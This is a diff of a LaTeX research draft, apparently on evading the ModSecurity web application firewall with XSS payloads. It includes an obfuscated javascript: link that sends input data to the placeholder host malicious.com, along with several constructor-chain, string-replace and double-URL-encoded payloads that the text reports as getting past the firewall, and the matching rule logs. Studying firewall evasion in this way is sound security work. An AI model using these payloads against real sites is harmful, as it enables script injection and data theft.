@@ -2,10 +2,10 @@
 \label{sec:EvaluationResults}
 Combination of <a> with javascript in href injection, HTML ascii encoding, tagged template literals (line breaks for readability)
 \begin{lstlisting}[style=basicStyle]
-	<a href=j&#97v&#97script&#x3A;
-	var&#32secret&#32=&#32document.getElementsByName("name")[0]&#46innerHTML;
-	var&#32data&#32=&#32&#123body:secret,method:'POST'\};
-	fetch`https:\//malicious.com:3001/api/ping?secret=querysecret$&#123data\}`>ClickMeFor$</a>
+<a href=j&#97v&#97script&#x3A;
+var&#32secret&#32=&#32document.getElementsByName("name")[0]&#46innerHTML;
+var&#32data&#32=&#32&#123body:secret,method:'POST'\};
+fetch`https:\//malicious.com:3001/api/ping?secret=querysecret$&#123data\}`>ClickMeFor$</a>
 \end{lstlisting}
 
 \begin{itemize}
@@ -18,23 +18,44 @@ Combination of <a> with javascript in href injection, HTML ascii encoding, tagge
 theoretically a payload without () is possible like this but it turns out that passing a template literal string with \verb|${...}| syntax is being flagged as unix command injection
 
 \begin{lstlisting}[style=basicStyle, caption=Payload inspired by \cite{onecons/wafbypass}]
-	[][`constructor`][`constructor`]`a${`al` + [open + []][0][11] + `rt` + [open + []][0][13] + [`"`][0] + `XSS` + [`"`][0] + [open + []][0][14]}```
+[][`constructor`][`constructor`]`a${`al` + [open + []][0][11] + `rt` + [open + []][0][13] + [`"`][0] + `XSS` + [`"`][0] + [open + []][0][14]}```
 \end{lstlisting}
 
 
 tried to encode the  payload:
 \begin{lstlisting}[style=basicStyle, caption=Payload inspired by \cite{onecons/wafbypass}]
-	[][`constructor`][`constructor`]`a${`al` + [open + []][0][11] + `rt` + [open + []][0][13] + [`"`][0] + `XSS` + [`"`][0] + [open + []][0][14]}```
+[][`constructor`][`constructor`]`a${`al` + [open + []][0][11] + `rt` + [open + []][0][13] + [`"`][0] + `XSS` + [`"`][0] + [open + []][0][14]}```
 \end{lstlisting}
 with unicode and html, even the weird unicode. but the modsecurity waf decodes both and blocks TODO
 
-weird unicode: tried using 
+weird unicode: tried using
 \begin{lstlisting}[style=basicStyle, caption=Payload inspired by \cite{onecons/wafbypass}]
-	console.log(encodeURIComponent('[][`constructor`][`constructor`]`a\uFE69{`al`+[open+[]][0][11]+`rt`+[open+[]][0][13]+[`"`][0]+`Oneconsult`+[`"`][0]+[open+[]][0][14]}```'))
+console.log(encodeURIComponent('[][`constructor`][`constructor`]`a\uFE69{`al`+[open+[]][0][11]+`rt`+[open+[]][0][13]+[`"`][0]+`Oneconsult`+[`"`][0]+[open+[]][0][14]}```'))
 
-	but result is 
+but result is
+
 {\t\"test2\": \"[][`constructor`][`constructor`]`a__{`al`+[open+[]][0][11]+`rt`+[open+[]][0][13]+[`\"`][0]+`Oneconsult`+[`\"`][0]+[open+[]][0][14]}```\"}
+
+tried using \u0000 - \u0009, \u2028, \u2029 but that makes the payload invalid. would work in the case when some characters are filtered first by the application, like linebreaks
 \end{lstlisting}
+
+in contrary to not using \verb|()|, a payload thats not using any \verb|{}| but still allows for tagged template literals or other usages of \verb|{}| can be created using string replace. the example payload in Listing~\ref{lst:stringreplaceblocked} is being blocked by the modsecurity firewall:
+
+\begin{lstlisting}[style=ruleStyle, language=XML, caption=blocked for \$\{\} example, label={lst:stringreplaceblocked}]
+<payload>[][`constructor`][`constructor`]('pro' + 'mpt`seeValueInInput${2+2}`')();</payload>
+<message>"Remote Command Execution: Unix Shell Expression Found"</message>
+<file>"/rules/REQUEST-932-APPLICATION-ATTACK-RCE.conf"</file>
+<fileDetails>[line "291"] [id "932130"]<fileDetails>
+<MatchedData>"${2 2}"</MatchedData>
+\end{lstlisting}
+
+if one uses a string replace strategy like mentioned in \ref{sec:stringreplace}, a payload in the form of
+
+\begin{lstlisting}[style=basicStyle, caption=string replace to evade {} detection, label={lst:stringreplacepass}]
+[][`constructor`][`constructor`]('pro' + 'mpt`seeValueInInput$' + [open + []][0][16] + '2+2' + [open + []][0][36] + ':`')();
+\end{lstlisting}
+
+successfully evades the firewall.
 
 
 unicode tests:
@@ -51,16 +72,35 @@ unicode tests:
 <fileDetails>[line "1263"] [id "920540"]<fileDetails>
 <MatchedData>"x5cu0024"</MatchedData>
 
-<payload>encodeURIComponent('`\u0024{`alert`}')</payload>
-<payload>"%60%24%7B%60alert%60%7D"</payload>
+<payload>encodeURIComponent('\u0024{`alert`}')</payload>
+<payload>%24%7B%60alert%60%7D</payload>
 <message>"Remote Command Execution: Unix Shell Expression Found"</message>
 <file>"/rules/REQUEST-932-APPLICATION-ATTACK-RCE.conf"</file>
 <fileDetails>[line "291"] [id "932130"]<fileDetails>
 <MatchedData>"${`alert`}"</MatchedData>
-
-<file>"rules/REQUEST-941-APPLICATION-ATTACK-XSS.conf"</file>
-<fileDetails>[line "714"] [id "941390"]<fileDetails>
-<MatchedData>"eval("</MatchedData>
 \end{lstlisting}
 
+url encoding: the modsecurity firewall detects url encoding. when sending example requests in plain and urlencoded forms, the requests get blocked. (See Listing~\ref{lst:urlencodedexampleblocked})
 
+\begin{lstlisting}[style=ruleStyle, language=XML, caption=url encoded example blocked, label={lst:urlencodedexampleblocked}]
+<payload>alert(`${new Date()}`)</payload>
+<payload>alert(%60%24%7Bnew%20Date()%7D%60)</payload>
+<message>"Remote Command Execution: Unix Shell Expression Found"</message>
+<file>"/rules/REQUEST-932-APPLICATION-ATTACK-RCE.conf"</file>
+<fileDetails>[line "291"] [id "932130"]<fileDetails>
+<MatchedData>"${new date()}"</MatchedData>
+
+<message>"Javascript method detected"</message>
+<file>"/rules/REQUEST-941-APPLICATION-ATTACK-XSS.conf"</file>
+<fileDetails>[line "714"] [id "941390"]<fileDetails>
+<MatchedData>"alert("</MatchedData>
+\end{lstlisting}
+
+on usage of double url encoding (see Listing~\ref{lst:doubleurlencodedexample}), the above mentioned rule with message \quotes{Remote Command Execution: Unix Shell Expression Found} does no longer trigger. the characters \verb|alert(| still trigger \quotes{Javascript Method detected}. substituting \verb|alert()| with \verb|prompt()| and using a tagged template literal instead of calling with \verb|()| will allow to successfully pass a payload that evades detection and is able to display the template parameter. however, this payload would not be valid unless the target performs multiple step url decoding.
+
+
+\begin{lstlisting}[style=basicStyle, caption=url encoded example pass, label={lst:doubleurlencodedexample}]
+encodeURIComponent(encodeURIComponent('alert(`${new Date()}`)'))
+=
+alert(%2560%2524%257Bnew%2520Date()%257D%2560)
+\end{lstlisting}
